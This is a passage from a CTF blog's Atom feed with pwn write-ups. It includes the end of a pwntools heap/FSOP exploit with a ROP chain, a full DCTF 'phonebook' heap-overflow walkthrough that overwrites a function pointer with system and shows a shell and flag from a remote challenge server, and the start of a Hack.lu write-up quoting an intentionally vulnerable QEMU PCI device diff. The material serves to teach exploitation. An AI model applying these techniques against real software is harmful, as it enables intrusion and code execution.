<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span><span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># large</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/diceCTF" term="diceCTF" label="diceCTF" />
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/aaSSfxxx" term="aaSSfxxx" label="aaSSfxxx" />
                             
                                <category scheme="https://nasm.re/tags/2022" term="2022" label="2022" />
                             
                                <category scheme="https://nasm.re/tags/FSOP" term="FSOP" label="FSOP" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[DCTF 2022 - pwn] phonebook]]></title>
            <link href="https://nasm.re/posts/phonebook/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/phonebook/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2022-04-17T00:00:00+00:00</published>
            <updated>2022-04-17T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h2 id="intro">
        Intro
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#intro" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Intro" href="#intro">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>phonebook is a basic heap challenge I did during the dctf event. It&rsquo;s basically just a heap overflow wich allows us to overflow a function pointer with for example the address of system.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="the-bug">
        The bug
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#the-bug" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor The bug" href="#the-bug">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<pre tabindex="0"><code>$ ./phonebook
Choose an option: [1-5]
1. Store someone's information
2. Edit information
3. Call someone
4. Unfriend someone
5. Add the hidden_note
&gt; 
</code></pre><p>We can create an entity and then initialize: a name, a numero and a function pointer.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
</span><span class="c1"></span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="p">)</span>
    <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Person with id %d already exists!&#34;</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20uLL</span><span class="p">);</span>
  <span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">get_name</span><span class="p">();</span>
  <span class="n">LODWORD</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Phone number: &#34;</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span> <span class="c1">// phone number
</span><span class="c1"></span>  <span class="n">s</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">choose_relation</span><span class="p">();</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The bug lies <code>edit_name</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">name_size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
</span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+28h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">];</span>
  <span class="n">name_size</span> <span class="o">=</span> <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name_size</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name length: &#34;</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">n</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">name_size</span> <span class="o">!=</span> <span class="n">n</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
    <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
  <span class="n">fgets</span><span class="p">(</span><span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>We can give it a new lentgh and if that&rsquo;s not equal to the current size field it frees the current name pointer and allocates a new name pointer <strong>without</strong> updating the size field. Which means if we edit the name pointer with a smaller size, the name pointer will be smaller compared to the size field, then we just have to edit again the size field to make it equal to <code>v4-&gt;name_size</code> to trigger a heap overflow through the <code>v4-&gt;name</code> pointer.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="leak-libc">
        Leak libc
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#leak-libc" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak libc" href="#leak-libc">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we&rsquo;re able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free&rsquo;d chunks in the unsortedbin. Or we can leak the <code>entity-&gt;func</code> function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of <code>puts</code> to leak its address within the libc.</p>
<p>To do so we can create another entity right after the name pointer:</p>
<pre tabindex="0"><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
0x559b0d4d16f0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1700	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1710	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1720	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1730	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1740	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1750	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1760	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1770	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1780	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d1790	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17a0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17b0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17c0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17d0	0x4141414141414141	0x4141414141414141	AAAAAAAAAAAAAAAA
0x559b0d4d17e0	0x4141414141414141	0x0000414141414141	AAAAAAAAAAAAAA..
0x559b0d4d17f0	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1800	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1810	0x6161616161616161	0x6161616161616161	aaaaaaaaaaaaaaaa
0x559b0d4d1820	0x0000000000000000	0x0000000000000031	........1.......
0x559b0d4d1830	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 &lt;-- Top chunk
</code></pre><p>The <code>edit_phone_number</code> overwrites the null byte:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter new phone number: &#34;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%8s&#34;</span><span class="p">,</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div><p>To summarise:</p>
<ul>
<li>leak binary base address by overwriting the null byte (<code>edit_phone_number</code>) and then print the phone numer.</li>
<li>leak libc base address by overwriting the name field of the second entity with the got entry of <code>puts</code></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/phonebook/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Then we just have to overwrite the function pointer with the address of <code>system</code> which takes as first argument a pointer to the entity structure of edit the phone number of the entity we wanna use because that&rsquo;s the first field of the structure which means we make it equivalent to a <code>system(&quot;/bin/sh&quot;)</code>.</p>
<pre tabindex="0"><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
00000000 num             dq ?
00000008 func            dq ?
00000010 name            dq ?                    ; offset
00000018 name_size       dq ?
00000020 entity          ends
</code></pre><p>Then here we are:</p>
<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
[*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Opening connection to 51.124.222.205 on port 13380: Done
[*] binary: 0x558980fdd000
[*] libc @ 0x7fabfec57000
[*] system @ 0x7fabfeca92c0
[*] Switching to interactive mode
$ id
uid=1337 gid=1337 groups=1337
$ cat flag.txt
DCTF{C4n_1_g3t_y0ur_numb3r?}
</code></pre>]]></content>
            
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/authors/nasm" term="nasm" label="nasm" />
                            
                        
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/pwn" term="pwn" label="pwn" />
                             
                                <category scheme="https://nasm.re/tags/heap" term="heap" label="heap" />
                             
                                <category scheme="https://nasm.re/tags/dctf" term="dctf" label="dctf" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[Hack.lu 2021 - pwn] Cloudinspect]]></title>
            <link href="https://nasm.re/posts/cloudinspect/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cloudinspect/</id>
            
                    <author>
                        <name>nasm</name>
                    </author>
            <published>2021-11-07T00:00:00+00:00</published>
            <updated>2021-11-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="cloudinspect">
        CloudInspect
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#cloudinspect" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor CloudInspect" href="#cloudinspect">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>CloundInpect was a hypervisor exploitation challenge I did for the <a
  class="gblog-markdown__link"
  href="https://flu.xxx"
  
  >Hack.lu event</a
>.
I didn&rsquo;t succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read!
The related files can be found <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2021/hack.lu/pwn/cloudinspect"
  
  >right here</a
></p>
<blockquote>
<p>After Whiterock released it&rsquo;s trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called &ldquo;cloudinspect&rdquo;.<br>
The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
</blockquote>
<div class="gblog-post__anchorwrap">
    <h2 id="vulnerable-pci-device">
        Vulnerable PCI device
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#vulnerable-pci-device" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Vulnerable PCI device" href="#vulnerable-pci-device">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We got several files:</p>
<pre tabindex="0"><code>$ ls
build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
</code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
</span><span class="gh"></span>new file mode 100644
<span class="gh">index 0000000000..f1c3f84b2a
</span><span class="gh"></span><span class="gd">--- /dev/null
</span><span class="gd"></span><span class="gi">+++ b/hw/misc/cloudinspect.c
</span><span class="gi"></span><span class="gu">@@ -0,0 +1,204 @@
</span><span class="gu"></span><span class="gi">+/*
</span><span class="gi">+ * QEMU cloudinspect intentionally vulnerable PCI device
</span><span class="gi">+ *
</span><span class="gi">+ */
</span><span class="gi">+
</span><span class="gi">+#include &#34;qemu/osdep.h&#34;
</span><span class="gi">+#include &#34;qemu/units.h&#34;
</span><span class="gi">+#include &#34;hw/pci/pci.h&#34;
</span><span class="gi">+#include &#34;hw/hw.h&#34;
</span><span class="gi">+#include &#34;hw/pci/msi.h&#34;
</span><span class="gi">+#include &#34;qom/object.h&#34;
</span><span class="gi">+#include &#34;qemu/module.h&#34;
</span><span class="gi">+#include &#34;qapi/visitor.h&#34;
</span><span class="gi">+#include &#34;sysemu/dma.h&#34;
</span><span class="gi">+
</span><span class="gi">+#define TYPE_PCI_CLOUDINSPECT_DEVICE &#34;cloudinspect&#34;
</span><span class="gi">+typedef struct CloudInspectState CloudInspectState;
</span><span class="gi">+DECLARE_INSTANCE_CHECKER(CloudInspectState, CLOUDINSPECT,
</span><span class="gi">+                         TYPE_PCI_CLOUDINSPECT_DEVICE)
</span><span class="gi">+
</span><span class="gi">+#define DMA_SIZE        4096
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
</span><span class="gi">+
</span><span class="gi">+#define CLOUDINSPECT_VENDORID 0x1337
</span><span class="gi">+#define CLOUDINSPECT_DEVICEID 0x1337
</span><span class="gi">+#define CLOUDINSPECT_REVISION 0xc1
</span><span class="gi">+
</span><span class="gi">+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
</span><span class="gi">+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
</span><span class="gi">+
</span><span class="gi">+struct CloudInspectState {
</span><span class="gi">+    PCIDevice pdev;
</span><span class="gi">+    MemoryRegion mmio;
</span><span class="gi">+    AddressSpace *as;
</span><span class="gi">+
</span><span class="gi">+    struct dma_state {
</span><span class="gi">+        dma_addr_t src;
</span><span class="gi">+        dma_addr_t dst;
</span><span class="gi">+        dma_addr_t cnt;
</span><span class="gi">+        dma_addr_t cmd;
</span><span class="gi">+    } dma;
</span><span class="gi">+    char dma_buf[DMA_SIZE];
</span><span class="gi">+};
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_dma_rw(CloudInspectState *cloudinspect, bool write)
</span><span class="gi">+{
</span><span class="gi">+    if (write) {
</span><span class="gi">+        uint64_t dst = cloudinspect-&gt;dma.dst;
</span><span class="gi">+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
</span><span class="gi">+        dma_memory_read(cloudinspect-&gt;as, cloudinspect-&gt;dma.src, cloudinspect-&gt;dma_buf + dst, cloudinspect-&gt;dma.cnt);
</span><span class="gi">+    } else {
</span><span class="gi">+        uint64_t src = cloudinspect-&gt;dma.src;
</span><span class="gi">+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
</span><span class="gi">+        dma_memory_write(cloudinspect-&gt;as, cloudinspect-&gt;dma.dst, cloudinspect-&gt;dma_buf + src, cloudinspect-&gt;dma.cnt);
</span><span class="gi">+    }
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static bool cloudinspect_DMA_op(CloudInspectState *cloudinspect, bool write) {
</span><span class="gi">+    switch (cloudinspect-&gt;dma.cmd) {
</span><span class="gi">+        case CLOUDINSPECT_DMA_GET_VALUE:
</span><span class="gi">+        case CLOUDINSPECT_DMA_PUT_VALUE:
</span><span class="gi">+            if (cloudinspect-&gt;dma.cnt &gt; DMA_SIZE) {
</span><span class="gi">+                return false;
</span><span class="gi">+            }
</span><span class="gi">+            cloudinspect_dma_rw(cloudinspect, write);
</span><span class="gi">+            break;
</span><span class="gi">+        default:
</span><span class="gi">+            return false;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    return true;
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static uint64_t cloudinspect_mmio_read(void *opaque, hwaddr addr, unsigned size)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
</span><span class="gi">+    uint64_t val = ~0ULL;
</span><span class="gi">+
</span><span class="gi">+    switch (addr) {
</span><span class="gi">+    case 0x00:
</span><span class="gi">+        val = 0xc10dc10dc10dc10d;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
</span><span class="gi">+        val = cloudinspect-&gt;dma.cmd;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
</span><span class="gi">+        val = cloudinspect-&gt;dma.src;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
</span><span class="gi">+        val = cloudinspect-&gt;dma.dst;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
</span><span class="gi">+        val = cloudinspect-&gt;dma.cnt;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, false);
</span><span class="gi">+        break;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    return val;
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_mmio_write(void *opaque, hwaddr addr, uint64_t val,
</span><span class="gi">+                unsigned size)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
</span><span class="gi">+
</span><span class="gi">+    switch (addr) {
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
</span><span class="gi">+        cloudinspect-&gt;dma.cmd = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
</span><span class="gi">+        cloudinspect-&gt;dma.src = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
</span><span class="gi">+        cloudinspect-&gt;dma.dst = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
</span><span class="gi">+        cloudinspect-&gt;dma.cnt = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, true);
</span><span class="gi">+        break;
</span><span class="gi">+    }
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static const MemoryRegionOps cloudinspect_mmio_ops = {
</span><span class="gi">+    .read = cloudinspect_mmio_read,
</span><span class="gi">+    .write = cloudinspect_mmio_write,
</span><span class="gi">+    .endianness = DEVICE_NATIVE_ENDIAN,
</span><span class="gi">+    .valid = {
</span><span class="gi">+        .min_access_size = 4,
</span><span class="gi">+        .max_access_size = 8,
</span><span class="gi">+    },
</span><span class="gi">+    .impl = {
</span><span class="gi">+        .min_access_size = 4,
</span><span class="gi">+        .max_access_size = 8,
</span><span class="gi">+    },
</span><span class="gi">+
</span><span class="gi">+};
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_realize(PCIDevice *pdev, Error **errp)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
</span><span class="gi">+    // uint8_t *pci_conf = pdev-&gt;config;
</span><span class="gi">+
</span><span class="gi">+    if (msi_init(pdev, 0, 1, true, false, errp)) {
</span><span class="gi">+        return;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    cloudinspect-&gt;as = &amp;address_space_memory;
</span><span class="gi">+    memory_region_init_io(&amp;cloudinspect-&gt;mmio, OBJECT(cloudinspect), &amp;cloudinspect_mmio_ops, cloudinspect,
</span><span class="gi">+                    &#34;cloudinspect-mmio&#34;, 1 * MiB);
</span><span class="gi">+    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;cloudinspect-&gt;mmio);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_uninit(PCIDevice *pdev)
</span><span class="gi">+{
</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
</span><span class="gi">+
</span><span class="gi">+    msi_uninit(pdev);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_instance_init(Object *obj)
</span><span class="gi">+{
</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(obj);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_class_init(ObjectClass *class, void *data)
</span><span class="gi">+{
</span><span class="gi">+    DeviceClass *dc = DEVICE_CLASS(class);
</span><span class="gi">+    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);
</span><span class="gi">+
</span><span class="gi">+    k-&gt;realize = pci_cloudinspect_realize;
</span><span class="gi">+    k-&gt;exit = pci_cloudinspect_uninit;
